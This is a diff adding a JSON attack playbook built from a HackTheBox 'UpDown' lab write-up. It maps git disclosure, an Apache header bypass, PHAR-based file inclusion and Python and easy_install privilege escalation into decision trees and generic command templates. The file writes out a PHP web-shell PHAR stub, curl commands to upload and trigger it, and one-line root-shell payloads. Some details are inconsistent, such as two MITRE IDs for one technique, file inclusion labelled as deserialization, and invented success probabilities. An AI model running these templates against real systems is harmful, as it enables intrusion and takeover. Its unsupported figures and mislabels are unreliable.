@@ -1,0 +1,1035 @@
+{
+  "writeup_id": "Htb_Updown",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_ssrf_git_disclosure_lfi_phar",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "git_repository_disclosure",
+    "privilege_path": "web_to_user_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "exposed_git_repository",
+      "apache_filtering_bypass",
+      "phar_deserialization",
+      "python_input_vulnerability",
+      "easy_install_privilege_escalation"
+    ],
+    "environmental_clues": [
+      "dev_subdomain_present",
+      "custom_user_agent_header",
+      "php_web_application",
+      "ubuntu_20_04_server"
+    ],
+    "similar_scenarios": [
+      "source_code_disclosure_boxes",
+      "web_lfi_to_rce"
+    ],
+    "unique_aspects": [
+      "ssrf_red_herring",
+      "phar_archive_exploitation",
+      "legacy_python_input_function",
+      "apache_mod_security_bypass"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Git Repository Disclosure",
+        "success_reason": "Exposed .git directory in /dev subdomain allowed source code access",
+        "prerequisite_indicators": [
+          "web_application_present",
+          "development_subdomain_exists",
+          "directory_listing_enabled"
+        ],
+        "recognition_patterns": [
+          "dev/staging subdomains",
+          "403 forbidden on subdomain root",
+          "git-dumper successful extraction",
+          "source code reveals additional endpoints"
+        ],
+        "failure_modes": [
+          "git_directory_properly_blocked",
+          "no_development_environments_exposed",
+          "git_hooks_prevent_access"
+        ],
+        "environmental_factors": [
+          "development_environment_misconfiguration",
+          "apache_directory_listing_enabled",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "SSRF_to_LFI_via_PHAR",
+        "success_reason": "Server-side request forgery combined with PHAR deserialization for code execution",
+        "prerequisite_indicators": [
+          "php_application_present",
+          "url_input_functionality",
+          "file_upload_or_creation_possible",
+          "phar_wrapper_enabled"
+        ],
+        "recognition_patterns": [
+          "custom user-agent in requests",
+          "debug mode reveals response content",
+          "php file extensions detected",
+          "file inclusion vulnerabilities present"
+        ],
+        "failure_modes": [
+          "phar_wrapper_disabled",
+          "strict_url_validation",
+          "file_upload_restrictions",
+          "safe_mode_enabled"
+        ],
+        "environmental_factors": [
+          "default_php_configuration",
+          "apache_mod_rewrite_rules",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "Python_Input_Function_Exploitation",
+        "success_reason": "Legacy Python script using dangerous input() function allowed code execution",
+        "prerequisite_indicators": [
+          "python_scripts_with_suid",
+          "legacy_python2_usage",
+          "user_input_processing"
+        ],
+        "recognition_patterns": [
+          "suid python scripts",
+          "input() function in source",
+          "python2 interpreter usage",
+          "privilege escalation opportunities"
+        ],
+        "failure_modes": [
+          "python3_raw_input_usage",
+          "proper_input_validation",
+          "no_suid_scripts",
+          "restricted_execution_environment"
+        ],
+        "environmental_factors": [
+          "legacy_system_components",
+          "mixed_python_versions",
+          "insufficient_security_hardening"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-25 minutes"
+      },
+      {
+        "technique": "Easy_Install_Privilege_Escalation",
+        "success_reason": "easy_install with sudo privileges allowed arbitrary code execution as root",
+        "prerequisite_indicators": [
+          "sudo_privileges_on_easy_install",
+          "python_package_management_access",
+          "setup_py_execution_possible"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows easy_install",
+          "python setuptools available",
+          "ability to create setup.py files",
+          "package installation permissions"
+        ],
+        "failure_modes": [
+          "restricted_sudo_configuration",
+          "no_package_management_privileges",
+          "hardened_python_environment"
+        ],
+        "environmental_factors": [
+          "development_system_configuration",
+          "loose_sudo_policies",
+          "python_development_tools_installed"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "exposed .git repository in /dev subdomain",
+        "discovery_method": "subdomain enumeration and directory traversal",
+        "why_critical": "Revealed complete source code including hidden endpoints and logic flaws",
+        "how_to_recognize": [
+          "403 forbidden on subdomain root",
+          "development/staging subdomain naming",
+          "git-dumper successful extraction",
+          "source code analysis reveals vulnerabilities"
+        ],
+        "follow_up_actions": [
+          "download_complete_repository",
+          "analyze_source_code_for_vulnerabilities",
+          "identify_hidden_endpoints",
+          "map_application_logic_flows"
+        ]
+      },
+      {
+        "discovery": "PHAR deserialization vulnerability",
+        "discovery_method": "source code analysis of checker.php",
+        "why_critical": "Enabled remote code execution through file inclusion",
+        "how_to_recognize": [
+          "php application with file operations",
+          "phar:// wrapper usage possible",
+          "file upload or creation functionality",
+          "insufficient input validation"
+        ],
+        "follow_up_actions": [
+          "create_malicious_phar_file",
+          "bypass_apache_restrictions",
+          "achieve_code_execution",
+          "establish_reverse_shell"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "suid_python_script_exploitation",
+        "why_possible": "Legacy Python2 script with dangerous input() function had suid permissions",
+        "recognition_signs": [
+          "find_suid_binaries_reveals_python_scripts",
+          "python2_interpreter_usage",
+          "input_function_in_source_code",
+          "user_controlled_input_processing"
+        ],
+        "exploitation_path": "SUID Python2 → input() exploitation → user privilege"
+      },
+      {
+        "privilege_level": "user",
+        "escalation_method": "sudo_easy_install_abuse",
+        "why_possible": "User had sudo privileges on easy_install allowing arbitrary code execution",
+        "recognition_signs": [
+          "sudo_l_shows_easy_install",
+          "python_setuptools_available",
+          "setup_py_execution_possible",
+          "package_installation_privileges"
+        ],
+        "exploitation_path": "sudo easy_install → malicious setup.py → root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 and 80 open on Linux host",
+        "decision": "Focus on web application enumeration and subdomain discovery",
+        "reasoning": "Limited attack surface requires thorough web reconnaissance",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if vulnerable versions identified"
+          }
+        ],
+        "success_indicators": [
+          "subdomains_discovered",
+          "hidden_directories_found",
+          "technology_stack_identified"
+        ],
+        "next_decision": "analyze_web_application_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Found SSRF-capable web application with dev subdomain",
+        "decision": "Enumerate dev subdomain and look for exposed development resources",
+        "reasoning": "Dev environments often have weaker security and exposed files",
+        "confidence": 0.85,
+        "prerequisites": [
+          "subdomain_enumeration_complete"
+        ],
+        "success_indicators": [
+          "git_repository_found",
+          "source_code_accessible"
+        ],
+        "failure_fallbacks": [
+          "ssrf_exploitation",
+          "parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found .git repository on dev subdomain",
+        "decision": "Download and analyze source code for vulnerabilities",
+        "reasoning": "Source code reveals application logic and potential security flaws",
+        "confidence": 0.95,
+        "prerequisites": [
+          "git_directory_accessible"
+        ],
+        "success_indicators": [
+          "source_code_downloaded",
+          "authentication_bypass_found"
+        ],
+        "next_decision": "analyze_access_controls"
+      },
+      {
+        "step": 4,
+        "situation": "Found .htaccess with Special-Dev header requirement",
+        "decision": "Bypass Apache filtering using discovered header",
+        "reasoning": "Header requirement provides access to restricted development area",
+        "confidence": 0.9,
+        "prerequisites": [
+          "htaccess_file_analyzed"
+        ],
+        "success_indicators": [
+          "dev_site_accessible",
+          "php_files_reachable"
+        ],
+        "next_decision": "exploit_application_vulnerabilities"
+      },
+      {
+        "step": 5,
+        "situation": "Found LFI vulnerability with path filtering in index.php",
+        "decision": "Use PHAR deserialization to achieve code execution",
+        "reasoning": "PHAR format bypasses extension restrictions and enables RCE",
+        "confidence": 0.8,
+        "prerequisites": [
+          "lfi_vulnerability_confirmed",
+          "file_upload_possible"
+        ],
+        "success_indicators": [
+          "phar_file_uploaded",
+          "code_execution_achieved"
+        ],
+        "alternatives": [
+          {
+            "option": "log_poisoning",
+            "when": "if log files accessible"
+          },
+          {
+            "option": "php_filter_chains",
+            "when": "if other methods fail"
+          }
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_limited_ports_found": {
+        "action": "intensive_web_enumeration",
+        "tools": [
+          "feroxbuster",
+          "wfuzz",
+          "nmap_scripts"
+        ],
+        "focus": "subdomain_and_directory_discovery"
+      },
+      "if_dev_subdomain_found": {
+        "action": "check_for_development_artifacts",
+        "targets": [
+          ".git",
+          "backup_files",
+          "config_files",
+          "source_code"
+        ],
+        "tools": [
+          "git-dumper",
+          "directory_bruteforce"
+        ]
+      },
+      "if_source_code_obtained": {
+        "action": "static_code_analysis",
+        "focus": [
+          "authentication_bypasses",
+          "file_inclusion",
+          "access_controls"
+        ],
+        "next_phase": "exploit_discovered_vulnerabilities"
+      },
+      "if_shell_obtained": {
+        "action": "privilege_escalation_enumeration",
+        "tools": [
+          "linpeas",
+          "manual_enumeration"
+        ],
+        "focus": [
+          "suid_binaries",
+          "sudo_permissions",
+          "legacy_scripts"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_dev_subdomains_for_git_repos",
+        "reasoning": "development_environments_frequently_expose_source_code",
+        "applicability": "web_applications_with_dev_subdomains"
+      },
+      {
+        "rule": "analyze_htaccess_files_for_bypass_mechanisms",
+        "reasoning": "access_controls_often_reveal_bypass_methods",
+        "applicability": "apache_web_servers_with_restrictions"
+      },
+      {
+        "rule": "consider_phar_deserialization_for_lfi_with_extension_restrictions",
+        "reasoning": "phar_format_bypasses_common_file_extension_filters",
+        "applicability": "php_applications_with_file_inclusion"
+      },
+      {
+        "rule": "enumerate_legacy_python_scripts_for_input_function_abuse",
+        "reasoning": "older_python_input_function_allows_code_execution",
+        "applicability": "systems_with_python2_scripts"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SSRF_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_url_input",
+          "server_side_request_functionality",
+          "internal_network_access"
+        ],
+        "success_indicators": [
+          "url_parameter_accepts_external_hosts",
+          "server_makes_outbound_requests",
+          "custom_user_agent_in_requests"
+        ],
+        "incompatible_with": [
+          "strict_url_validation",
+          "network_egress_filtering",
+          "localhost_blocking"
+        ],
+        "confidence_boosters": [
+          "debug_mode_available",
+          "response_content_reflection",
+          "custom_user_agent_patterns"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Git_Repository_Exposure",
+        "mitre_id": "T1213.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_server_with_git_directory",
+          "development_subdomain_exists",
+          "directory_listing_enabled_or_git_accessible"
+        ],
+        "success_indicators": [
+          "git_directory_accessible",
+          "development_subdomain_found",
+          "source_code_recovery_possible"
+        ],
+        "incompatible_with": [
+          "git_directory_properly_blocked",
+          "no_development_environments",
+          "strict_access_controls"
+        ],
+        "confidence_boosters": [
+          "dev_subdomain_detected",
+          "403_forbidden_on_dev_paths",
+          "git_specific_directory_structure"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "PHP_LFI_to_RCE",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "php_web_application",
+          "file_inclusion_vulnerability",
+          "phar_wrapper_enabled"
+        ],
+        "success_indicators": [
+          "php_file_extensions_detected",
+          "file_parameter_in_requests",
+          "phar_deserialization_possible"
+        ],
+        "incompatible_with": [
+          "phar_wrapper_disabled",
+          "strict_file_path_validation",
+          "open_basedir_restrictions"
+        ],
+        "confidence_boosters": [
+          "index_php_responds",
+          "file_upload_functionality",
+          "apache_php_configuration"
+        ],
+        "typical_success_rate": 0.72,
+        "estimated_time": "20-60 minutes"
+      },
+      {
+        "technique": "Subdomain_Enumeration",
+        "mitre_id": "T1590.001",
+        "required_services": [
+          "http",
+          "https",
+          "dns"
+        ],
+        "required_ports": [
+          53,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "domain_name_in_use",
+          "multiple_subdomains_exist",
+          "dns_resolution_available"
+        ],
+        "success_indicators": [
+          "domain_name_identified",
+          "vhost_routing_detected",
+          "different_responses_per_subdomain"
+        ],
+        "incompatible_with": [
+          "single_domain_only",
+          "no_vhost_routing",
+          "dns_blocking"
+        ],
+        "confidence_boosters": [
+          "domain_name_in_page_content",
+          "custom_user_agent_with_domain",
+          "development_environments_present"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "php_web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "PHP",
+          "Apache",
+          "index.php"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "development_environment": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "subdomain_indicators": [
+          "dev",
+          "development",
+          "staging",
+          "test"
+        ],
+        "confidence_threshold": 0.75
+      },
+      "git_repository": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "path_indicators": [
+          "/.git/",
+          "/.git/config",
+          "/.git/HEAD"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ubuntu_linux": {
+        "port_indicators": [
+          22,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "ssh",
+          "http"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH",
+          "Apache/2.4.41"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "subdomain_enumeration",
+          "when": "domain_name_detected",
+          "reason": "often_reveals_development_environments"
+        },
+        {
+          "attack": "git_repository_exposure",
+          "when": "development_subdomain_found",
+          "reason": "high_chance_of_source_code_disclosure"
+        },
+        {
+          "attack": "ssrf_exploitation",
+          "when": "url_input_functionality_detected",
+          "reason": "immediate_server_side_access_potential"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "php_lfi_exploitation",
+          "when": "php_application_and_file_parameters_detected",
+          "reason": "reliable_path_to_rce_if_conditions_met"
+        },
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "discovers_hidden_paths_and_functionality"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Git Repository Disclosure",
+        "mitre_id": "T1213.002",
+        "category": "collection",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "git-dumper",
+            "command_template": "/opt/git-dumper/git_dumper.py http://{target}/.git/ {output_dir}",
+            "actual_command": "/opt/git-dumper/git_dumper.py http://siteisup.htb/dev/.git/ .",
+            "output_pattern": "Updated {n} paths from the index",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "exposed_git_directory",
+          "web_server_directory_listing_enabled"
+        ],
+        "success_indicators": [
+          "source_code_downloaded",
+          "configuration_files_obtained",
+          "authentication_mechanisms_revealed"
+        ],
+        "common_failures": [
+          "git_directory_not_exposed",
+          "incomplete_repository_download",
+          "corrupted_git_objects"
+        ],
+        "follow_up_techniques": [
+          "source_code_analysis",
+          "credential_extraction",
+          "vulnerability_identification"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Apache .htaccess Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -H 'Special-Dev: only4dev' http://{target}",
+            "actual_command": "curl -H 'Special-Dev: only4dev' http://dev.siteisup.htb",
+            "output_pattern": "200 OK response with page content",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          }
+        ],
+        "prerequisites": [
+          "htaccess_file_analysis",
+          "custom_header_requirement_identified"
+        ],
+        "success_indicators": [
+          "403_forbidden_bypassed",
+          "protected_content_accessible",
+          "development_interface_exposed"
+        ],
+        "common_failures": [
+          "incorrect_header_value",
+          "case_sensitive_header_matching",
+          "additional_authentication_required"
+        ],
+        "follow_up_techniques": [
+          "local_file_inclusion",
+          "file_upload_exploitation",
+          "source_code_review"
+        ],
+        "time_investment": "1-3 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "PHAR Deserialization via File Upload",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "php",
+            "command_template": "php -r \"$phar = new Phar('{filename}.phar'); $phar->startBuffering(); $phar->addFromString('{filename}.txt', '{content}'); $phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering();\"",
+            "actual_command": "php -r \"$phar = new Phar('shell.phar'); $phar->startBuffering(); $phar->addFromString('shell.txt', 'test'); $phar->setStub('<?php system($_GET[\\\"cmd\\\"]); __HALT_COMPILER(); ?>'); $phar->stopBuffering();\"",
+            "output_pattern": "PHAR archive created successfully",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality",
+          "local_file_inclusion_vulnerability",
+          "phar_extension_allowed_or_bypassable"
+        ],
+        "success_indicators": [
+          "phar_file_uploaded_successfully",
+          "code_execution_achieved",
+          "web_shell_accessible"
+        ],
+        "common_failures": [
+          "file_extension_blocked",
+          "file_deleted_before_inclusion",
+          "phar_deserialization_disabled"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Python Input() Exploitation",
+        "mitre_id": "T1059.006",
+        "category": "execution",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "python_input_injection",
+            "command_template": "__import__('os').system('{command}')",
+            "actual_command": "__import__('os').system('/bin/bash')",
+            "output_pattern": "Shell spawned with elevated privileges",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "python_script_using_input_function",
+          "script_execution_privileges",
+          "legacy_python2_environment"
+        ],
+        "success_indicators": [
+          "arbitrary_code_execution",
+          "privilege_escalation_achieved",
+          "interactive_shell_obtained"
+        ],
+        "common_failures": [
+          "python3_environment_with_safe_input",
+          "input_validation_implemented",
+          "restricted_execution_environment"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting",
+          "persistence_establishment",
+          "system_enumeration"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Easy_Install Privilege Escalation",
+        "mitre_id": "T1548.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "easy_install",
+            "command_template": "echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"exec /bin/sh <&0 >&0 2>&0\")' > setup.py && sudo easy_install .",
+            "actual_command": "echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"exec /bin/sh <&0 >&0 2>&0\")' > setup.py && sudo easy_install .",
+            "output_pattern": "Root shell obtained",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "sudo_privileges_on_easy_install",
+          "write_access_to_working_directory",
+          "python_setuptools_installed"
+        ],
+        "success_indicators": [
+          "root_shell_obtained",
+          "full_system_compromise",
+          "administrative_privileges_gained"
+        ],
+        "common_failures": [
+          "no_sudo_privileges",
+          "easy_install_not_available",
+          "restricted_sudo_configuration"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "credential_dumping",
+          "lateral_movement"
+        ],
+        "time_investment": "1-2 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "git-dumper",
+        "use_case": "exposed_git_repository_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "source_code_disclosure",
+          "configuration_extraction"
+        ],
+        "alternatives": [
+          "manual_git_object_download",
+          "wget_recursive"
+        ],
+        "best_practices": [
+          "check_for_git_directory_in_subdirectories",
+          "verify_repository_integrity_after_download",
+          "analyze_commit_history_for_secrets"
+        ]
+      },
+      {
+        "tool": "PHAR",
+        "use_case": "php_deserialization_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "php_code_execution",
+          "file_upload_bypass"
+        ],
+        "alternatives": [
+          "zip_archive_exploitation",
+          "direct_php_upload"
+        ],
+        "best_practices": [
+          "test_phar_stream_wrapper_availability",
+          "use_minimal_stub_for_stealth",
+          "combine_with_lfi_for_maximum_impact"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "git_to_source_disclosure",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -I http://target.com/dev/.git/HEAD",
+            "purpose": "Verify git repository exposure",
+            "expected_output": "200 OK response"
+          },
+          {
+            "step": 2,
+            "command": "/opt/git-dumper/git_dumper.py http://target.com/dev/.git/ ./source",
+            "purpose": "Download complete repository",
+            "expected_output": "Source code files extracted"
+          },
+          {
+            "step": 3,
+            "command": "find ./source -name '*.php' -o -name '.htaccess' -o -name '*.conf'",
+            "purpose": "Identify critical configuration files",
+            "expected_output": "List of configuration and source files"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "3-8 minutes"
+      },
+      {
+        "sequence_name": "phar_upload_to_rce",
+        "steps": [
+          {
+            "step": 1,
+            "command": "php -r \"$p=new Phar('shell.phar');$p->startBuffering();$p->addFromString('t.txt','test');$p->setStub('<?php system($_GET[\\\"c\\\"]); __HALT_COMPILER(); ?>');$p->stopBuffering();\"",
+            "purpose": "Create malicious PHAR file",
+            "expected_output": "PHAR file created successfully"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST -F 'file=@shell.phar' -H 'Special-Dev: only4dev' http://dev.target.com",
+            "purpose": "Upload PHAR via file upload",
+            "expected_output": "File uploaded to temporary directory"
+          },
+          {
+            "step": 3,
+            "command": "curl -H 'Special-Dev: only4dev' 'http://dev.target.com/?page=phar://uploads/[hash]/shell.phar/t&c=id'",
+            "purpose": "Trigger PHAR deserialization for RCE",
+            "expected_output": "Command execution output"
+          }
+        ],
+        "success_rate": 0.78,
+        "typical_duration": "15-25 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "UpDown",
+      "difficulty": "Medium",
+      "os": "Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2022-09-03",
+      "author": "AB2",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "ssrf",
+        "lfi",
+        "git_exposure",
+        "phar_deserialization"
+      ],
+      "key_vulnerabilities": [
+        "apache_filter_bypass",
+        "php_phar_rce",
+        "python_input_function",
+        "easy_install_privilege_escalation"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "ssrf_exploitation",
+        "git_repository_analysis",
+        "phar_attacks",
+        "python_legacy_exploits"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "php_internals",
+        "git_basics",
+        "python_scripting"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "ssrf",
+        "code_execution",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "server_side_request_forgery",
+        "local_file_inclusion",
+        "deserialization",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "secure_git_practices",
+        "disable_phar_wrappers",
+        "avoid_legacy_python_functions"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bolt",
+        "Previse",
+        "Writer"
+      ],
+      "similarity_reasons": [
+        "git_exposure",
+        "web_app_vulnerabilities",
+        "filter_bypass_techniques"
+      ],
+      "unique_aspects": [
+        "phar_deserialization_rce",
+        "easy_install_privesc",
+        "apache_subdomain_filtering"
+      ],
+      "difficulty_factors": [
+        "multiple_bypass_techniques",
+        "chained_exploits",
+        "source_code_analysis"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T13:54:30.752322",
+    "original_file": "0xdf_writeups/Htb Updown.md",
+    "content_length": 40721,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
